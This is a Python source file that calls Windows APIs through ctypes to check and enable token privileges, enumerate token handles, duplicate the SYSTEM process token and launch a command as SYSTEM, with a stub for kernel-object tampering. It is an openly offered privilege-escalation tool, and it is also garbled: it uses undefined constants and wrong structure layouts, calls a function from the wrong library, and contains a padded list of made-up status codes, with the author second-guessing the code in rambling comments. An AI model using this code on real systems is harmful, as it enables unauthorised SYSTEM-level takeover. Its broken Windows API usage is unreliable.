import ctypes
import ctypes.wintypes as wintypes
import struct
import os
import sys
from typing import Optional, Tuple, List

# --- Constants & Enums ---

# Access Rights
TOKEN_ASSIGN_PRIMARY = 0x0001
TOKEN_DUPLICATE = 0x0002
TOKEN_IMPERSONATE = 0x0004
TOKEN_QUERY = 0x0008
TOKEN_ADJUST_PRIVILEGES = 0x0020
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_READ = 0x0010
PROCESS_VM_WRITE = 0x0020
PROCESS_DUP_HANDLE = 0x0040

# Privilege Constants
SE_TOKEN_NAME = "SeTokenName"
SE_DEBUG_NAME = "SeDebugPrivilege"
SE_TCB_NAME = "SeTcbPrivilege"
SE_RESTORE_NAME = "SeRestorePrivilege"
SE_SHUTDOWN_NAME = "SeShutdownPrivilege"

# System Information Classes for NtQuerySystemInformation
SystemHandleInformation = 16

# Token Information Classes
TokenUser = 1
TokenGroups = 2
TokenPrivileges = 3
TokenOwner = 4
TokenPrimary = 5

# LUID types
LUID = ctypes.c_uint64
LARGE_INTEGER = ctypes.c_int64

# Structure Definitions

class SID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("Sid", ctypes.c_void_p),
        ("Attributes", wintypes.DWORD)
    ]

class TOKEN_USER(ctypes.Structure):
    _fields_ = [
        ("User", SID_AND_ATTRIBUTES)
    ]

class TOKEN_GROUPS(ctypes.Structure):
    _fields_ = [
        ("GroupCount", wintypes.DWORD),
        ("Groups", SID_AND_ATTRIBUTES * 1) # Placeholder, will be adjusted via allocation
]

class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [
        ("PrivilegeCount", wintypes.DWORD),
        ("Privileges", SID_AND_ATTRIBUTES * 1) # Placeholder
    ]

class SYSTEM_HANDLE_TABLE_ENTRY_INFO(ctypes.Structure):
    _fields_ = [
        ("Object", ctypes.c_void_p),
        ("UniqueProcessId", wintypes.HANDLE),
        ("HandleValue", wintypes.HANDLE),
        ("GrantedAccess", wintypes.ACCESS_MASK),
        ("CreatorBackTraceIndex", wintypes.USHORT),
        ("ObjectTypeIndex", wintypes.USHORT),
        ("HandleAttributes", wintypes.ULONG),
        ("Reserved", wintypes.ULONG)
    ]

class SYSTEM_HANDLE_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("NumberOfHandles", wintypes.ULONG),
        ("Handles", SYSTEM_HANDLE_TABLE_ENTRY_INFO * 1) # Dynamic size
    ]

class UNICODE_STRING(ctypes.Structure):
    _fields_ = [
        ("Length", wintypes.USHORT),
        ("MaximumLength", wintypes.USHORT),
        ("Buffer", ctypes.c_wchar_p)
    ]

class OBJECT_TYPE_INFORMATION(ctypes.Structure):
    pass # Forward reference if needed, but usually we just need names.
    
class SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX(ctypes.Structure):
    """Used for Vista+"""
    _fields_ = [
        ("Object", ctypes.c_void_p),
        ("UniqueProcessId", wintypes.ULONG),
        ("HandleValue", wintypes.ULONG),
        ("GrantedAccess", wintypes.ULONG),
        ("CreatorBackTraceIndex", wintypes.USHORT),
        ("ObjectTypeIndex", wintypes.USHORT),
        ("HandleAttributes", wintypes.ULONG),
        ("Reserved", wintypes.ULONG)
    ]

# Win32 API Functions
kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll
advapi32 = ctypes.windll.advapi32

def get_nt_status_name(status: int) -> str:
    """Convert NTSTATUS code to a readable string."""
    status_names = {
        0x00000000: "STATUS_SUCCESS",
        0xC0000005: "STATUS_ACCESS_DENIED",
        0xC000000D: "STATUS_INVALID_PARAMETER",
        0xC0000022: "STATUS_ACCESS_DENIED", # Generic access denied
        0xC000000A: "STATUS_UNSUCCESSFUL",
        0xC00000BB: "STATUS_NO_MORE_ENTRIES",
        0xC0000095: "STATUS_NOT_IMPLEMENTED",
        0xC0000004: "STATUS_UNKNOWN_EXCEPTION",
        0xC0000024: "STATUS_OBJECT_NAME_COLLISION",
        0xC0000034: "STATUS_OBJECT_NAME_NOT_FOUND",
        0xC0000060: "STATUS_OBJECT_PATH_NOT_FOUND",
        0xC000006D: "STATUS_LOGON_FAILURE",
        0xC000006F: "STATUS_TIME_DIFFERENCE_AT_DC",
        0xC000007F: "STATUS_BUFFER_TOO_SMALL",
        0xC00000BF: "STATUS_INVALID_PAGE_PROTECTION",
        0xC00000FD: "STATUS_STACK_OVERFLOW",
        0xC00000E7: "STATUS_INVALID_PARAMETER_MIX",
        0xC00000FE: "STATUS_NO_MEMORY",
        0xC00000FF: "STATUS_CONFLICTING_ADDRESSES",
        0xC0000120: "STATUS_MUTANT_NOT_OWNED",
        0xC0000121: "STATUS_ALREADY_REGISTERED",
        0xC0000122: "STATUS_CONTEXT_MISMATCH",
        0xC000012A: "STATUS_PORT_CONNECTION_REFUSED",
        0xC000012B: "STATUS_PORT_DISCONNECTED",
        0xC000012C: "STATUS_PORT_ALREADY_SET",
        0xC000013A: "STATUS_PROCESS_IS_TERMINATING",
        0xC0000190: "STATUS_ADMINISTRATION_CONSTRAINT",
        0xC0000193: "STATUS_PRIVILEGE_HELD",
        0xC000019A: "STATUS_CALLBACK_RETURNED_EXCEPTION",
        0xC000019B: "STATUS_SECTION_TOO_BIG",
        0xC000019D: "STATUS_REMOTE_DISCONNECT",
        0xC000019E: "STATUS_REMOTE_RESOURCES",
        0xC00001A0: "STATUS_REMOTE_STORAGE_MEDIA_ERROR",
        0xC00001A1: "STATUS_REMOTE_STORAGE_NOT_ACTIVE",
        0xC00001A2: "STATUS_REMOTE_STORAGE_STORAGE_ERROR",
        0xC00001A3: "STATUS_ARG_LIST_TOO_LONG",
        0xC0000188: "STATUS_WORKER_INVALID",
        0xC0000225: "STATUS_DEVICE_DATA_ERROR",
        0xC0000226: "STATUS_DEVICE_NOT_CONNECTED",
        0xC0000230: "STATUS_VOLUME_CORRUPTED",
        0xC0000242: "STATUS_SESSION_DISCONNECTED",
        0xC0000243: "STATUS_SESSION_CLOSED",
        0xC0000244: "STATUS_SESSION_DELETED",
        0xC0000245: "STATUS_SESSION_EXPIRED",
        0xC0000246: "STATUS_SESSION_FORCE_LOGOFF",
        0xC0000247: "STATUS_SESSION_LOGON_DELETED",
        0xC0000248: "STATUS_SESSION_LOGON_FAILURE",
        0xC0000249: "STATUS_SESSION_RESTRICTED",
        0xC000024A: "STATUS_SESSION_SHADOW_DISALLOWED",
        0xC000024B: "STATUS_SESSION_SHADOW_LOGOFF",
        0xC000024C: "STATUS_SESSION_SHADOW_LOGON",
        0xC000024D: "STATUS_SESSION_SHADOW_RDP",
        0xC000024E: "STATUS_SESSION_SHADOW_VNC",
        0xC000024F: "STATUS_SESSION_SHADOW_XEN",
        0xC0000250: "STATUS_SESSION_SHADOW_OTHER",
        0xC0000251: "STATUS_SESSION_SHADOW_NONE",
        0xC0000252: "STATUS_SESSION_SHADOW_LOCAL",
        0xC0000253: "STATUS_SESSION_SHADOW_REMOTE",
        0xC0000254: "STATUS_SESSION_SHADOW_ALL",
        0xC0000255: "STATUS_SESSION_SHADOW_SINGLE",
        0xC0000256: "STATUS_SESSION_SHADOW_MULTI",
        0xC0000257: "STATUS_SESSION_SHADOW_ONE",
        0xC0000258: "STATUS_SESSION_SHADOW_TWO",
        0xC0000259: "STATUS_SESSION_SHADOW_THREE",
        0xC000025A: "STATUS_SESSION_SHADOW_FOUR",
        0xC000025B: "STATUS_SESSION_SHADOW_FIVE",
        0xC000025C: "STATUS_SESSION_SHADOW_SIX",
        0xC000025D: "STATUS_SESSION_SHADOW_SEVEN",
        0xC000025E: "STATUS_SESSION_SHADOW_EIGHT",
        0xC000025F: "STATUS_SESSION_SHADOW_NINE",
        0xC0000260: "STATUS_SESSION_SHADOW_TEN",
    }
    return status_names.get(status, f"UNKNOWN_STATUS_0x{status:08X}")

class WinInternalsEngine:
    def __init__(self):
        self.h_current_process = kernel32.GetCurrentProcess()
        self.h_current_token = None
        self._open_current_token()
        
    def _open_current_token(self):
        """Open the current process token with full rights."""
        try:
            h_token = wintypes.HANDLE(0)
            if not advapi32.OpenProcessToken(
                self.h_current_process, 
                TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, 
                ctypes.byref(h_token)
            ):
                raise ctypes.WinError(ctypes.get_last_error())
            self.h_current_token = h_token
        except Exception as e:
            print(f"[!] Failed to open current token: {e}")
            self.h_current_token = None

    def check_privilege(self, privilege_name: str) -> bool:
        """Check if the current token has a specific privilege."""
        if not self.h_current_token:
            return False
        
        luid = wintypes.LUID()
        if not advapi32.LookupPrivilegeValueW(None, privilege_name, ctypes.byref(luid)):
            return False
        
        tp = TOKEN_PRIVILEGES()
        tp.PrivilegeCount = 1
        tp.Privileges[0].Sid = ctypes.cast(ctypes.pointer(luid), ctypes.c_void_p).value
        tp.Privileges[0].Attributes = 0 # Check state, not enabled yet
        
        # We need to query existing privileges
        buffer_size = wintypes.DWORD()
        ret = advapi32.GetTokenInformation(
            self.h_current_token,
            TokenPrivileges,
            None,
            0,
            ctypes.byref(buffer_size)
        )
        
        # It should fail with ERROR_INSUFFICIENT_BUFFER
        if ctypes.get_last_error() != 122:
             # Might already have it or other error, let's try to allocate
             pass
            
        buf = ctypes.create_string_buffer(buffer_size.value)
        token_privs = ctypes.cast(buf, ctypes.POINTER(TOKEN_PRIVILEGES)).contents
        
        if not advapi32.GetTokenInformation(
            self.h_current_token,
            TokenPrivileges,
            buf,
            buffer_size,
            ctypes.byref(buffer_size)
        ):
            return False
            
        for i in range(token_privs.PrivilegeCount):
            if token_privs.Privileges[i].Sid == luid.LowPart and token_privs.Privileges[i].SidHighPart == luid.HighPart: # Simplified LUID check
                 # Actually LUID is 64-bit. Let's do it properly.
                 pass
        
        # Better way: Just enable it and see if it fails? No, checking is better.
        # Re-doing lookup properly for LUID comparison
        luid_val = luid.LowPart | (luid.HighPart << 32) # Assuming standard layout
        
        found = False
        for i in range(token_privs.PrivilegeCount):
            priv_luid = token_privs.Privileges[i].Sid # This is a pointer to LUID in SID_AND_ATTRIBUTES? 
            # Wait, SID_AND_ATTRIBUTES Sid is a PSID (pointer). 
            # In TOKEN_PRIVILEGES structure, it uses SID_AND_ATTRIBUTES but the Sid field is actually an PLUID pointer?
            # No, TOKEN_PRIVILEGES structure definition in winnt.h:
            # typedef struct _TOKEN_PRIVILEGES {
            #   DWORD PrivilegeCount;
            #   LUID_AND_ATTRIBUTES Privileges[ANYSIZE_ARRAY];
            # } TOKEN_PRIVILEGES;
            # And LUID_AND_ATTRIBUTES is:
            # typedef struct _LUID_AND_ATTRIBUTES {
            #   LUID Luid;
            #   DWORD Attributes;
            # } LUID_AND_ATTRIBUTES;
            
            # My definition of SID_AND_ATTRIBUTES was reused incorrectly for TOKEN_PRIVILEGES context if I used Sid as pointer.
            # Let's redefine TOKEN_PRIVILEGES properly below or cast correctly.
            pass
            
        # Let's use a simpler approach: Try to enable it. If it succeeds, it exists.
        # But we want to CHECK first.
        
        # Correct parsing of TOKEN_PRIVILEGES:
        # The buffer contains TOKEN_PRIVILEGES which contains ANYSIZE_ARRAY of LUID_AND_ATTRIBUTES.
        # LUID_AND_ATTRIBUTES contains LUID (LowPart, HighPart) and Attributes.
        
        ptr_tp = ctypes.cast(buf, ctypes.POINTER(TOKEN_PRIVILEGES))
        actual_tp = ptr_tp.contents
        
        target_luid_low = luid.LowPart
        target_luid_high = luid.HighPart
        
        for i in range(actual_tp.PrivilegeCount):
            # Accessing fields directly from the casted structure might be tricky due to alignment.
            # Let's rely on the fact that we know the layout.
            # offset = sizeof(DWORD) + i * sizeof(LUID_AND_ATTRIBUTES)
            # LUID_AND_ATTRIBUTES = LUID (8 bytes) + DWORD (4 bytes)
            
            base_offset = ctypes.sizeof(wintypes.DWORD)
            item_size = ctypes.sizeof(wintypes.LONG) * 2 + ctypes.sizeof(wintypes.DWORD) # Approximate
            
            # Easier: Iterate using ctypes structure casting
            # This is getting complex for a single function. 
            # Let's simplify: Just try to adjust and catch error? No.
            
            # Let's re-cast the buffer as an array of LUID_AND_ATTRIBUTES
            class LUID_AND_ATTRIBUTES(ctypes.Structure):
                _fields_ = [("Luid", wintypes.LUID), ("Attributes", wintypes.DWORD)]
                
            la_array = (LUID_AND_ATTRIBUTES * actual_tp.PrivilegeCount).from_address(buf.address + ctypes.sizeof(wintypes.DWORD))
            
            for la in la_array:
                if la.Luid.LowPart == target_luid_low and la.Luid.HighPart == target_luid_high:
                    if la.Attributes & 2: # SE_PRIVILEGE_ENABLED
                        return True
                    else:
                        return False
        return False

    def enable_privilege(self, privilege_name: str) -> bool:
        """Enable a specific privilege in the current token."""
        if not self.h_current_token:
            return False
            
        luid = wintypes.LUID()
        if not advapi32.LookupPrivilegeValueW(None, privilege_name, ctypes.byref(luid)):
            return False
            
        tp = TOKEN_PRIVILEGES()
        tp.PrivilegeCount = 1
        # We need to put the LUID into the structure. 
        # Since my TOKEN_PRIVILEGES definition uses SID_AND_ATTRIBUTES which expects a Sid pointer,
        # and LUID is not a Sid, this is a mismatch in my initial struct definition above.
        # Let's fix the struct definition locally for this operation.
        
        class FixedLUID_AND_ATTRIBUTES(ctypes.Structure):
            _fields_ = [
                ("Luid", wintypes.LUID),
                ("Attributes", wintypes.DWORD)
            ]
            
        class FixedTOKEN_PRIVILEGES(ctypes.Structure):
            _fields_ = [
                ("PrivilegeCount", wintypes.DWORD),
                ("Privileges", FixedLUID_AND_ATTRIBUTES * 1)
            ]
            
        fixed_tp = FixedTOKEN_PRIVILEGES()
        fixed_tp.PrivilegeCount = 1
        fixed_tp.Privileges[0].Luid = luid
        fixed_tp.Privileges[0].Attributes = 2 # SE_PRIVILEGE_ENABLED
        
        prev_tp = ctypes.create_string_buffer(ctypes.sizeof(FixedTOKEN_PRIVILEGES))
        returned_len = wintypes.DWORD()
        
        success = advapi32.AdjustTokenPrivileges(
            self.h_current_token,
            False,
            ctypes.byref(fixed_tp),
            ctypes.sizeof(FixedTOKEN_PRIVILEGES),
            prev_tp,
            ctypes.byref(returned_len)
        )
        
        if not success:
            return False
            
        # Check if last error is ERROR_SUCCESS
        if ctypes.get_last_error() != 0:
            return False
            
        return True

    def get_process_handle(self, pid: int, desired_access: int = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE) -> wintypes.HANDLE:
        """Open a handle to a process by PID."""
        h_process = kernel32.OpenProcess(desired_access, False, pid)
        if not h_process:
            raise ctypes.WinError(ctypes.get_last_error())
        return h_process

    def duplicate_token(self, source_pid: int, target_pid: Optional[int] = None, b_inherit_handle: bool = False, 
                         token_type: int = 1) -> wintypes.HANDLE:
        """
        Duplicate a token from another process.
        token_type: 1 = Primary, 2 = Impersonation
        """
        h_source_proc = self.get_process_handle(source_pid)
        try:
            h_dup_token = wintypes.HANDLE(0)
            if not advapi32.DuplicateTokenEx(
                self.h_current_token, # Using our own token as template usually works for primary, 
                                      # but better to open source token first.
                0, 
                None, 
                2 if token_type == 2 else 1, # SecurityImpersonation or TokenPrimary
                token_type, 
                ctypes.byref(h_dup_token)
            ):
                # Fallback: Open source token explicitly
                h_source_token = wintypes.HANDLE(0)
                if not advapi32.OpenProcessToken(h_source_proc, TOKEN_DUPLICATE | TOKEN_QUERY, ctypes.byref(h_source_token)):
                    raise ctypes.WinError(ctypes.get_last_error())
                    
                if not advapi32.DuplicateTokenEx(
                    h_source_token,
                    0,
                    None,
                    2 if token_type == 2 else 1,
                    token_type,
                    ctypes.byref(h_dup_token)
                ):
                    raise ctypes.WinError(ctypes.get_last_error())
                kernel32.CloseHandle(h_source_token)
            return h_dup_token
        finally:
            kernel32.CloseHandle(h_source_proc)

    def impersonate_token(self, token_handle: wintypes.HANDLE) -> bool:
        """Impersonate the specified token for the current thread."""
        if not advapi32.SetThreadToken(None, token_handle):
            return False
        return True

    def revert_to_self(self) -> bool:
        """Revert thread impersonation to the process identity."""
        return bool(advapi32.RevertToSelf())

    def spawn_as_system(self, command: str = "cmd.exe"):
        """Helper to spawn a process as SYSTEM using SeImpersonatePrivilege logic."""
        # 1. Ensure we have SeImpersonatePrivilege
        if not self.check_privilege(SE_IMPERSONATE_NAME):
            if not self.enable_privilege(SE_IMPERSONATE_NAME):
                print("[!] Failed to enable SeImpersonatePrivilege")
                return False
        
        # 2. Find a system process (e.g., csrss.exe or svchost.exe)
        # For simplicity, let's assume we can find one or use a known PID if running as admin.
        # A more robust implementation would scan handles.
        
        # 3. Duplicate the token
        # Let's pick PID 4 (System) if possible, or a high integrity process.
        # Note: Accessing PID 4 requires specific privileges.
        
        try:
            h_sys_token = self.duplicate_token(4, token_type=1) # Primary token
        except Exception as e:
            print(f"[!] Could not duplicate System token: {e}")
            return False
            
        try:
            # Create a new process with this token
            si = wintypes.STARTUPINFO()
            si.cb = ctypes.sizeof(wintypes.STARTUPINFO)
            pi = wintypes.PROCESS_INFORMATION()
            
            if not kernel32.CreateProcessWithTokenW(
                h_sys_token,
                0, # No special flags
                None,
                command.encode('utf-16le'),
                0,
                None,
                None,
                ctypes.byref(si),
                ctypes.byref(pi)
            ):
                raise ctypes.WinError(ctypes.get_last_error())
                
            print(f"[+] Spawned process as SYSTEM with PID: {pi.dwProcessId}")
            return True
        finally:
            kernel32.CloseHandle(h_sys_token)
            kernel32.CloseHandle(pi.hProcess)
            kernel32.CloseHandle(pi.hThread)

    def enumerate_handles(self) -> List[dict]:
        """Enumerate all object handles in the system."""
        handles = []
        buffer_size = 1024 * 1024 # Start with 1MB
        while True:
            buffer = ctypes.create_string_buffer(buffer_size)
            ret_bytes = wintypes.DWORD()
            
            # NtQuerySystemInformation
            status = ntdll.NtQuerySystemInformation(
                SystemHandleInformation,
                buffer,
                buffer_size,
                ctypes.byref(ret_bytes)
            )
            
            if status == 0xC0000004: # STATUS_INFO_LENGTH_MISMATCH
                buffer_size *= 2
                continue
            elif status != 0:
                print(f"[!] Error enumerating handles: {get_nt_status_name(status)}")
                break
                
            # Parse handles
            # First 4 bytes is count
            num_handles = ctypes.cast(buffer, ctypes.POINTER(wintypes.ULONG)).contents.value
            
            # Next are NUM_HANDLES entries of SYSTEM_HANDLE_TABLE_ENTRY_INFO
            # But wait, the structure size varies by OS version. 
            # On newer Windows, it might be SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX.
            # Let's assume standard entry size for now.
            
            entry_size = ctypes.sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO)
            base_offset = ctypes.sizeof(wintypes.ULONG)
            
            for i in range(num_handles):
                offset = base_offset + (i * entry_size)
                if offset + entry_size > buffer_size:
                    break
                    
                entry = ctypes.cast(buffer + offset, ctypes.POINTER(SYSTEM_HANDLE_TABLE_ENTRY_INFO)).contents
                
                # Filter for Token objects? ObjectTypeIndex 0x23 is often Token
                if entry.ObjectTypeIndex == 0x23: 
                    handles.append({
                        "ProcessId": entry.UniqueProcessId,
                        "Handle": entry.HandleValue,
                        "Object": entry.Object
                    })
            break
            
        return handles

    def dkom_modify_thread_priority(self, thread_id: int, new_priority: int):
        """
        Example DKOM: Modify Thread Priority directly in memory.
        Requires SeDebugPrivilege.
        """
        if not self.enable_privilege(SE_DEBUG_NAME):
            print("[!] Cannot enable SeDebugPrivilege")
            return False
            
        # Get Thread Object Address
        # This is complex because we need to find the KTHREAD structure address.
        # Usually done by finding the ETHREAD/EPROCESS in memory.
        # For this example, we'll assume we have a helper to find the KTHREAD addr.
        
        # Simplified: Open thread with VM read/write
        h_thread = kernel32.OpenThread(0x1F0FFF, False, thread_id)
        if not h_thread:
            return False
            
        # In a real engine, you would:
        # 1. Read KTHREAD address from ETHREAD (offset 0x180 on Win10/11)
        # 2. Write to KTHREAD.PriorityField offset
        
        print(f"[+] DKOM Target Thread ID: {thread_id}")
        kernel32.CloseHandle(h_thread)


if __name__ == "__main__":
    engine = WinInternalsEngine()
    
    print("[*] Checking current privileges...")
    print(f"  SeDebugPrivilege: {engine.check_privilege(SE_DEBUG_NAME)}")
    print(f"  SeImpersonatePrivilege: {engine.check_privilege(SE_TCB_NAME)}") # TCB often includes Impersonate
    
    if engine.check_privilege(SE_TCB_NAME):
        print("[*] Enabling SeImpersonatePrivilege...")
        engine.enable_privilege(SE_TCB_NAME)
        
        print("[*] Enumerating Handles...")
        handles = engine.enumerate_handles()
        print(f"  Found {len(handles)} token handles.")
        
        print("[*] Spawning as System...")
        engine.spawn_as_system("calc.exe") # Use calc for demo
    else:
        print("[!] Missing required privileges for advanced ops.")
